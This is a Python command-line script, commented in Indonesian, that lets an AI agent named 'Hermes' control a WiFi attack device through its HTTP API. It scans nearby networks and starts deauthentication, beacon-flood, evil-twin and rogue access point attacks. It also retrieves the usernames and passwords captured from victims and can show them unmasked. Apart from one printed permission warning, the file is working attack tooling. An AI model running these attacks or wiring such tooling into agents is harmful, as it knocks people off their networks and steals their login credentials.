#!/usr/bin/env python3
"""
wifilab.py — jembatan antara Hermes agent dan perangkat WiFiLab.

Perangkat WiFiLab membuka Web UI + HTTP API di http://192.168.4.1
(SSID AP: WiFiLab). Script ini membungkus API itu jadi perintah CLI
yang bisa dipanggil Hermes sebagai skill.

Hanya pakai pustaka bawaan Python. Tanpa pip install.

Pemakaian:
    python3 wifilab.py status
    python3 wifilab.py pindai
    python3 wifilab.py pantau
    python3 wifilab.py berhenti
    python3 wifilab.py kredensial
    python3 wifilab.py serang --jenis beacon --jumlah 10

    WIFILAB_HOST=192.168.4.1 python3 wifilab.py status   (kalau IP berbeda)
"""
import json
import os
import sys
import time
import urllib.parse
import urllib.request

HOST = os.environ.get("WIFILAB_HOST", "192.168.4.1")
BASE = f"http://{HOST}"


def api(path, timeout=12):
    """GET ke API WiFiLab, mengembalikan dict JSON."""
    try:
        with urllib.request.urlopen(BASE + path, timeout=timeout) as r:
            return json.load(r)
    except Exception as e:  # noqa: BLE001
        print(f"Tidak bisa menghubungi {BASE}{path}: {e}")
        print("Pastikan perangkat ini terhubung ke AP WiFiLab.")
        sys.exit(2)


def cmd_status():
    s = api("/api/status")
    print(f"Mode      : {s.get('mode')}")
    print(f"SSID alat : {s.get('ssid')}")
    print(f"Target    : {s.get('target') or '-'}")
    print(f"Uptime    : {s.get('uptime')} dtk")
    print(f"Klien terdeteksi : {s.get('clients')}")
    print(f"Deauth terdeteksi: {s.get('deauthSeen')}")


def cmd_pindai(tunggu_maks=20):
    api("/api/scan")
    print("Memindai jaringan WiFi sekitar...")
    for _ in range(tunggu_maks):
        time.sleep(2)
        j = api("/api/nets", timeout=6)
        if j.get("done"):
            nets = j.get("nets", [])
            if not nets:
                print("Tidak ada jaringan ditemukan.")
                return
            print(f"{'SSID':<28}{'Sinyal':<10}{'Kan.':<6}Enkripsi")
            print("-" * 56)
            for n in nets:
                print(f"{(n.get('ssid') or '(tersembunyi)'):<28}"
                      f"{n.get('rssi')} dBm   "
                      f"{str(n.get('ch')):<6}{n.get('enc')}")
            print(f"\nBSSID tiap jaringan tersedia di data mentah.")
            return
    print("Pindai belum selesai dalam batas tunggu. Coba lagi.")


def cmd_pantau():
    s = api("/api/status")
    mode = s.get("mode")
    print(f"Mode: {mode} | Klien: {s.get('clients')} | "
          f"Deauth terlihat: {s.get('deauthSeen')} | "
          f"Uptime: {s.get('uptime')} dtk")
    if mode != "idle":
        print(f"Target aktif: {s.get('target') or '-'}")


def cmd_berhenti():
    j = api("/api/attack?cmd=stop")
    print("Serangan dihentikan." if j.get("ok") else f"Respons: {j}")


def cmd_kredensial(tampilkan=False):
    j = api("/api/creds")
    creds = j.get("creds", [])
    print(f"Total kredensial tertangkap: {len(creds)}")
    for c in creds:
        u = c.get("u", "")
        p = c.get("p", "")
        if tampilkan:
            print(f"  t={c.get('t')}s  user={u}  pass={p}")
        else:
            print(f"  t={c.get('t')}s  user={u}  pass={'*' * min(len(p), 8)}")
    if creds and not tampilkan:
        print("(password disamarkan; pakai --tampilkan untuk melihat penuh)")


def cmd_serang(jenis, bssid="", ch="1", ssid="", jumlah="12"):
    print("PERINGATAN: hanya untuk lab milikmu sendiri / yang kamu punya izin.")
    q = {"cmd": "start", "kind": jenis}
    if jenis == "deauth":
        if not bssid:
            print("Butuh --bssid untuk deauth.")
            sys.exit(1)
        q.update({"bssid": bssid, "ch": ch, "ssid": ssid})
    elif jenis == "beacon":
        q.update({"count": jumlah})
    elif jenis == "eviltwin":
        if not ssid:
            print("Butuh --ssid untuk evil twin.")
            sys.exit(1)
        q.update({"ssid": ssid, "ch": ch})
    elif jenis == "rogue":
        if not ssid:
            print("Butuh --ssid untuk rogue AP.")
            sys.exit(1)
        q.update({"ssid": ssid})
    else:
        print(f"Jenis tidak dikenal: {jenis} "
              f"(deauth|beacon|eviltwin|rogue)")
        sys.exit(1)
    path = "/api/attack?" + urllib.parse.urlencode(q)
    j = api(path)
    print("Perintah terkirim." if j.get("ok") else f"Respons: {j}")


def bantuan():
    print(__doc__)


def main(argv):
    if len(argv) < 2 or argv[1] in ("-h", "--help", "bantuan"):
        bantuan()
        return
    perintah = argv[1]
    # argumen sederhana --kunci nilai
    opt = {}
    i = 2
    while i < len(argv):
        if argv[i].startswith("--") and i + 1 < len(argv):
            opt[argv[i][2:]] = argv[i + 1]
            i += 2
        else:
            i += 1

    if perintah == "status":
        cmd_status()
    elif perintah == "pindai":
        cmd_pindai()
    elif perintah == "pantau":
        cmd_pantau()
    elif perintah == "berhenti":
        cmd_berhenti()
    elif perintah == "kredensial":
        cmd_kredensial(tampilkan="tampilkan" in opt or "tampilkan" in argv)
    elif perintah == "serang":
        cmd_serang(
            opt.get("jenis", ""),
            bssid=opt.get("bssid", ""),
            ch=opt.get("ch", "1"),
            ssid=opt.get("ssid", ""),
            jumlah=opt.get("jumlah", "12"),
        )
    else:
        print(f"Perintah tidak dikenal: {perintah}\n")
        bantuan()
        sys.exit(1)


if __name__ == "__main__":
    main(sys.argv)
